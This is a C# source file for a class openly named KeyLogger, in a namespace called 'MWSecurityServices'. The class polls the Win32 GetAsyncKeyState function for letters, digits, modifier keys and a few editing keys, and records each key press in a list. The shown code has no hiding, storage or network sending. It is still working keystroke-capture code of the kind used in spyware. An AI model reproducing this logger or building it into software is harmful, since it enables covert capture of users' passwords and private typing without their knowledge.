using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MWSecurityServices
{
    class KeyLogger
    {
        public List<string> log;
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        public KeyLogger()
        {
            log = new List<string>();
        }
        public void CheckForKeys()
        {
                if (GetAsyncKeyState(Keys.A) == -32767)
                {
                    log.Add("A");
                }
                if (GetAsyncKeyState(Keys.B) == -32767)
                {
                log.Add("B");
                }
                if (GetAsyncKeyState(Keys.C) == -32767)
                {
                log.Add("C");
                }
                if (GetAsyncKeyState(Keys.D) == -32767)
                {
                log.Add("D");
                }
                if (GetAsyncKeyState(Keys.E) == -32767)
                {
                log.Add("E");
                }
                if (GetAsyncKeyState(Keys.F) == -32767)
                {
                log.Add("F");
                }
                if (GetAsyncKeyState(Keys.G) == -32767)
                {
                log.Add("G");
                }
                if (GetAsyncKeyState(Keys.H) == -32767)
                {
                log.Add("H");
                }
                if (GetAsyncKeyState(Keys.I) == -32767)
                {
                log.Add("I");
                }
                if (GetAsyncKeyState(Keys.J) == -32767)
                {
                log.Add("J");
                }
                if (GetAsyncKeyState(Keys.K) == -32767)
                {
                log.Add("K");
                }
                if (GetAsyncKeyState(Keys.L) == -32767)
                {
                log.Add("L");
                }
                if (GetAsyncKeyState(Keys.M) == -32767)
                {
                log.Add("M");
                }
                if (GetAsyncKeyState(Keys.N) == -32767)
                {
                log.Add("N");
                }
                if (GetAsyncKeyState(Keys.O) == -32767)
                {
                log.Add("O");
                }
                if (GetAsyncKeyState(Keys.P) == -32767)
                {
                log.Add("P");
                }
                if (GetAsyncKeyState(Keys.Q) == -32767)
                {
                log.Add("Q");
                }
                if (GetAsyncKeyState(Keys.R) == -32767)
                {
                log.Add("R");
                }
                if (GetAsyncKeyState(Keys.S) == -32767)
                {
                log.Add("S");
                }
                if (GetAsyncKeyState(Keys.T) == -32767)
                {
                log.Add("T");
                }
                if (GetAsyncKeyState(Keys.U) == -32767)
                {
                log.Add("U");
                }
                if (GetAsyncKeyState(Keys.V) == -32767)
                {
                log.Add("V");
                }
                if (GetAsyncKeyState(Keys.W) == -32767)
                {
                log.Add("W");
                }
                if (GetAsyncKeyState(Keys.X) == -32767)
                {
                log.Add("X");
                }
                if (GetAsyncKeyState(Keys.Y) == -32767)
                {
                log.Add("Y");
                }
                if (GetAsyncKeyState(Keys.Z) == -32767)
                {
                log.Add("Z");
                }
            if (GetAsyncKeyState(Keys.Enter) == -32767)
            {
                log.Add("Enter");
            }
            if (GetAsyncKeyState(Keys.Shift) == -32767)
            {
                log.Add("Shift");
            }
            if (GetAsyncKeyState(Keys.Control) == -32767)
            {
                log.Add("Ctrl");
            }
            if (GetAsyncKeyState(Keys.Alt) == -32767)
            {
                log.Add("Alt");
            }
            if (GetAsyncKeyState(Keys.Back) == -32767)
            {
                log.Add("Backspace");
            }
            if (GetAsyncKeyState(Keys.Delete) == -32767)
            {
                log.Add("Delete");
            }
            if (GetAsyncKeyState(Keys.D0) == -32767)
            {
                log.Add("0");
            }
            if (GetAsyncKeyState(Keys.D1) == -32767)
            {
                log.Add("1");
            }
            if (GetAsyncKeyState(Keys.D2) == -32767)
            {
                log.Add("2");
            }
            if (GetAsyncKeyState(Keys.D3) == -32767)
            {
                log.Add("3");
            }
            if (GetAsyncKeyState(Keys.D4) == -32767)
            {
                log.Add("4");
            }
            if (GetAsyncKeyState(Keys.D5) == -32767)
            {
                log.Add("5");
            }
            if (GetAsyncKeyState(Keys.D6) == -32767)
            {
                log.Add("6");
            }
            if (GetAsyncKeyState(Keys.D7) == -32767)
            {
                log.Add("7");
            }
            if (GetAsyncKeyState(Keys.D8) == -32767)
            {
                log.Add("8");
            }
            if (GetAsyncKeyState(Keys.D9) == -32767)
            {
                log.Add("9");
            }
            if (GetAsyncKeyState(Keys.OemPeriod) == -32767)
            {
                log.Add(".");
            }

        }
    }
}
